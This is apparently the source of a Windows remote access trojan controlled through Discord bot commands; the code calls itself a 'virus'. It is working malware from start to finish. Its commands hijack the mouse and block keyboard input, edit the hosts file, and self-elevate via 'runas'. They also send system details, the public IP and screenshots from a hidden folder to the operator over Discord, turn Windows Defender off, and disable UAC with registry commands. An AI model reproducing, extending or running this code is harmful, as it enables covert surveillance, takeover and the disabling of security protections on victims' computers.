import ctypes,threading,os;import winreg as reg;import queue;import subprocess,webbrowser,asyncio,platform,sys,psutil,cpuinfo,GPUtil,socket,discord
import datetime
from payloads.defender import yesdefend, nodefend
import requests
import uuid
import rotatescreen
import pyautogui,random,string
from PIL import ImageGrab
ctypes.windll.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
ctypes.windll.kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
import pyautogui
import ctypes
import discord
from discord.ext import commands
import time

async def mouse_control(ctx, action: str = "help", *args):
    async def send_help_embed(title, color):
        embed = discord.Embed(
            title=title,
            description=(
                "**Mouse Commands:**\n\n"
                "**Click:**\n"
                "`click left` - Left click\n"
                "`click middle` - Middle click\n"
                "`click right` - Right click\n\n"
                "**Move:**\n"
                "`move <x> <y>` - Move to coordinates\n"
                "**Example:** `move 100 200`\n\n"
                "**Freeze/Unfreeze:**\n"
                "`freeze` - Freeze mouse/keyboard\n"
                "`unfreeze` - Unfreeze mouse/keyboard\n\n"
                "**Drag:**\n"
                "`drag <x> <y>` - Drag to coordinates\n"
                "**Example:** `drag 200 300`\n"
            ),
            color=color
        )
        embed.set_footer(text="MOUSE COMMANDS")
        await ctx.send(embed=embed)

    try:
        if action == "help":
            await send_help_embed("Mouse Control Help", discord.Color.blue())
        elif action == "click" and args[0].lower() in ["left", "right", "middle"]:
            pyautogui.click(button=args[0].lower())
            await ctx.send(f"Mouse clicked `{args[0]}` button.")
        elif action == "move" and len(args) == 2:
            x, y = map(int, args)
            pyautogui.moveTo(x, y, duration=0)
            await ctx.send(f"Mouse moved to `{x}, {y}`.")
        elif action == "drag" and len(args) == 2:
            x, y = map(int, args)
            pyautogui.mouseDown()
            pyautogui.moveTo(x, y, duration=0.5)
            pyautogui.mouseUp()
            await ctx.send(f"Mouse dragged to `{x}, {y}`.")
        elif action in ["freeze", "unfreeze"]:
            ctypes.windll.user32.BlockInput(action == "freeze")
            await ctx.send("Input blocked." if action == "freeze" else "Input unblocked.")
        else:
            await send_help_embed("INVALID ACTION", discord.Color.red())
    except Exception as e:
        await ctx.send(f"Error: {e}")


async def taskbar(ctx, action):
 try:
  hwnd_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
  if action == "hide":
   ctypes.windll.user32.ShowWindow(hwnd_taskbar, 0)
   await ctx.send("Taskbar hidden.")
  elif action == "show":
   ctypes.windll.user32.ShowWindow(hwnd_taskbar, 5)
   await ctx.send("Taskbar shown.")
  else:
   await ctx.send("Invalid argument. Use 'hide' or 'show'.")
 except Exception as e:
  await ctx.send(f"Error: {e}")
HOSTS_PATH = r"C:\Windows\System32\drivers\etc\hosts"
REDIRECT_IP = "127.0.0.1"
BLOCKED_SITE = "discord.com"

async def sites(ctx, action=None, site=None):
    if not action or not site or action not in ["block", "unblock", "help"]:
        embed = discord.Embed(
            title="Sites Command Help",
            description="Use `.sites block <url>` to block or `.sites unblock <url>` to unblock.",
            color=discord.Color.red()
        )
        embed.add_field(name="Example", value=".sites block example.com", inline=False)
        await ctx.send(embed=embed)
        return
    
    if site.lower() == BLOCKED_SITE:
        embed = discord.Embed(
            title="Cannot Block",
            description="You cannot block discord.com as it is the current host.", 
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    try:
        with open(HOSTS_PATH, "r+") as file:
            lines = file.readlines()
            file.seek(0)
            if action == "block":
                if any(site in line for line in lines):
                    embed = discord.Embed(
                        title="Already Blocked",
                        description=f"{site} is already blocked.",
                        color=discord.Color.orange()
                    )
                else:
                    file.writelines(lines)
                    file.write(f"{REDIRECT_IP} {site}\n")
                    embed = discord.Embed(
                        title="Success",
                        description=f"Blocked {site}.",
                        color=discord.Color.green()
                    )
            elif action == "unblock":
                new_lines = [line for line in lines if site not in line]
                if len(new_lines) == len(lines):
                    embed = discord.Embed(
                        title="Not Found",
                        description=f"{site} is not in the block list.",
                        color=discord.Color.orange()
                    )
                else:
                    file.writelines(new_lines)
                    file.truncate()
                    embed = discord.Embed(
                        title="Success",
                        description=f"Unblocked {site}.",
                        color=discord.Color.green()
                    )
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=str(e),
            color=discord.Color.red()
        )
    await ctx.send(embed=embed)

async def admin(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("virus already has admin perms")
            return

        script = sys.argv[0]
        params = " ".join(sys.argv[1:])
        command = f"python {script} {params}"

        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, command, None, 1)
    except Exception as e:
        await ctx.send(f"Error: {e}")
            
async def sysinfo(ctx):
    try:
        cpu_name=None
        cpu_architecture=None
        cpu_cores=None
        cpu_threads=None
        cpu_current_freq=None
        cpu_max_freq=None
        cpu_temp=None
        try:
            cpu_info=cpuinfo.get_cpu_info()
            cpu_name=cpu_info.get('brand_raw')
            cpu_architecture=cpu_info.get('arch')
        except:
            pass
        try:
            cpu_cores=psutil.cpu_count(logical=False)
            cpu_threads=psutil.cpu_count(logical=True)
            cpu_freq=psutil.cpu_freq()
            cpu_temp=psutil.sensors_temperatures().get('coretemp', [])[0].current if psutil.sensors_temperatures() else None
            if cpu_freq:
                cpu_current_freq=f"{cpu_freq.current:.2f} MHz"
                cpu_max_freq=f"{cpu_freq.max:.2f} MHz"
        except:
            pass
        ram_total=None
        ram_used=None
        ram_available=None
        try:
            ram=psutil.virtual_memory()
            ram_total=f"{ram.total / (1024 ** 3):.2f} GB"
            ram_used=f"{ram.used / (1024 ** 3):.2f} GB ({ram.percent}%)"
            ram_available=f"{ram.available / (1024 ** 3):.2f} GB"
        except:
            pass
        disk_info=''
        try:
            disks=psutil.disk_partitions()
            for disk in disks:
                try:
                    usage=psutil.disk_usage(disk.mountpoint)
                    disk_info+=f"{disk.device} - {disk.mountpoint}\nTotal: {usage.total / (1024 ** 3):.2f} GB\nUsed: {usage.used / (1024 ** 3):.2f} GB ({usage.percent}%)\nFree: {usage.free / (1024 ** 3):.2f} GB\n"
                except PermissionError:
                    pass
        except:
            pass
        gpu_info=''
        try:
            gpus=GPUtil.getGPUs()
            for gpu in gpus:
                gpu_info+=f"GPU: {gpu.name}\nMemory Total: {gpu.memoryTotal} MB\nMemory Used: {gpu.memoryUsed} MB\nMemory Free: {gpu.memoryFree} MB\nGPU Utilization: {gpu.load * 100}%\nGPU Temperature: {gpu.temperature}°C\n"
        except:
            pass
        try:
            public_ip=requests.get('https://api.ipify.org').text
        except:
            public_ip="Could not retrieve public IP"
        system_info=platform.uname()
        current_datetime=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        running_threads=len(psutil.pids())
        num_cpus=psutil.cpu_count()
        hwid=str(uuid.uuid5(uuid.NAMESPACE_DNS, platform.node()))
        embed=discord.Embed(title="Hardware Information", color=discord.Color.blue())
        if cpu_name:
            embed.add_field(name="CPU Info", value=f"Name: {cpu_name}\nArchitecture: {cpu_architecture}\nCores: {cpu_cores}\nThreads: {cpu_threads}\nCurrent Frequency: {cpu_current_freq}\nMax Frequency: {cpu_max_freq}\nTemperature: {cpu_temp}°C", inline=False)
        if ram_total:
            embed.add_field(name="RAM Info", value=f"Total: {ram_total}\nUsed: {ram_used}\nAvailable: {ram_available}", inline=False)
        if disk_info:
            embed.add_field(name="Disk Info", value=disk_info, inline=False)
        if gpu_info:
            embed.add_field(name="GPU Info", value=gpu_info, inline=False)
        embed.add_field(name="Public IP Address", value=public_ip, inline=False)
        embed.add_field(name="HWID", value=hwid, inline=False)
        embed.add_field(name="System Info", value=f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}", inline=False)
        embed.add_field(name="Date and Time", value=current_datetime, inline=False)
        embed.add_field(name="CPUs and Running Threads", value=f"Number of CPUs: {num_cpus}\nRunning Threads: {running_threads}", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error retrieving hardware information: {str(e)}")
async def takepic(ctx, timeout=8):
    folder = os.path.join(os.getenv('APPDATA'), 'screenshots')
    if not os.path.exists(folder):
        os.makedirs(folder)
        try: ctypes.windll.kernel32.SetFileAttributesW(folder, 2)
        except: pass
    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".png"
    path = os.path.join(folder, filename)
    async def capture_screenshot():
        try: pyautogui.screenshot(path).save(path)
        except: pass
        if not os.path.exists(path):
            try: ImageGrab.grab().save(path)
            except: pass
    try:
        await asyncio.wait_for(capture_screenshot(), timeout=timeout)
        await ctx.send("heres da screenshot:", file=discord.File(path) if os.path.exists(path) else None)
    except asyncio.TimeoutError:
        await ctx.send("screenshot wasnt taken cuz it took a bit too long, try again.")
    except: await ctx.send("error taking ss")
async def rotate(ctx, angle: str = None):
    if angle is None or angle.lower() == "help":
        embed = discord.Embed(title=".rotate Command Help", description="This command rotates your screen to a specified angle.", color=discord.Color.blue())
        embed.add_field(name="Valid Angles", value="The valid angles are: 0, 90, 180, 270.")
        embed.add_field(name="Usage", value=".rotate <angle>\nExample: `.rotate 90`")
        await ctx.send(embed=embed)
        return

    try:
        angle = int(angle)
    except ValueError:
        embed = discord.Embed(title="Invalid Argument!", description="Please use one of the following valid angles: 0, 90, 180, or 270.", color=discord.Color.red())
        embed.add_field(name="Valid Arguments", value="0, 90, 180, 270")
        embed.add_field(name="Example Usage", value=".rotate 90")
        await ctx.send(embed=embed)
        return

    if angle not in [0, 90, 180, 270]:
        embed = discord.Embed(title="Invalid Argument!", description="Please use one of the following valid angles: 0, 90, 180, or 270.", color=discord.Color.red())
        embed.add_field(name="Valid Arguments", value="0, 90, 180, 270")
        embed.add_field(name="Example Usage", value=".rotate 90")
        await ctx.send(embed=embed)
        return

    try:
        screen = rotatescreen.get_primary_display()
        screen.rotate_to(angle)
        await ctx.send(f"Screen rotated to {angle} degrees.")
    except Exception as e:
        await ctx.send(f"An error occurred while rotating the screen: {e}")
async def defend(ctx, action: str = None):
    embed = discord.Embed(
        title="Defender Command",
        color=discord.Color.blue() if action is None else discord.Color.green() if action.lower() == 'on' else discord.Color.red() if action.lower() == 'off' else discord.Color.orange()
    )
    if action is None:
        embed.description = "This command toggles Windows Defender."
        embed.add_field(name="Usage", value=".defend on/off", inline=False)
    elif action.lower() == 'on':
        try:
            yesdefend()
            embed.description = "Windows Defender has been successfully enabled."
        except Exception as e:
            embed.description = f"Failed to enable Windows Defender: {str(e)}"
            embed.color = discord.Color.red()
    elif action.lower() == 'off':
        try:
            nodefend()
            embed.description = "Windows Defender has been successfully disabled."
        except Exception as e:
            embed.description = f"Failed to disable Windows Defender: {str(e)}"
            embed.color = discord.Color.red()
    else:
        embed.description = "Please provide a valid argument: `on` or `off`."
        embed.add_field(name="Usage", value=".defend on/off", inline=False)
    embed.set_footer(text="Defender Bot")
    await ctx.send(embed=embed)
async def uac(ctx, action: str = None):
    if action is None:
        embed = discord.Embed(description="Please specify 'enable', 'disable', or 'get' to check UAC status.", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(title="UAC Status", color=discord.Color.blue())
    try:
        if action.lower() == 'disable':
            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",), kwargs={'shell': True}).start()
            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",), kwargs={'shell': True}).start()
            embed.add_field(name="Action", value="UAC disabled.", inline=False)
            embed.add_field(name="Commands", value="reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f", inline=False)

        elif action.lower() == 'enable':
            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f",), kwargs={'shell': True}).start()
            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f",), kwargs={'shell': True}).start()
            embed.add_field(name="Action", value="UAC enabled.", inline=False)
            embed.add_field(name="Commands", value="reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f", inline=False)

        elif action.lower() == 'get':
            lua_status = subprocess.run("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA", shell=True, capture_output=True, text=True)
            if "0x1" in lua_status.stdout:
                embed.add_field(name="UAC Status", value="Enabled", inline=False)
            else:
                embed.add_field(name="UAC Status", value="Disabled", inline=False)
        
        else:
            embed = discord.Embed(description="Invalid action. Please specify 'enable', 'disable', or 'get'.", color=discord.Color.red())
        
    except Exception as e:
        embed = discord.Embed(description=f"Error: {str(e)}", color=discord.Color.red())

    await ctx.send(embed=embed)